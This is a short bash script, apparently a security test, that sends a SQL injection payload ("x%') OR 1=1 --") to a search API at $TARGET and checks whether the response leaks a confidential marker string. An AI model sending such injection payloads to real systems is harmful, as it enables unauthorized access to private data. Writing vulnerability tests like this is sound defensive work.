#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
curl -sG "$TARGET/api/posts/search" --data-urlencode "q=x%') OR 1=1 --" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
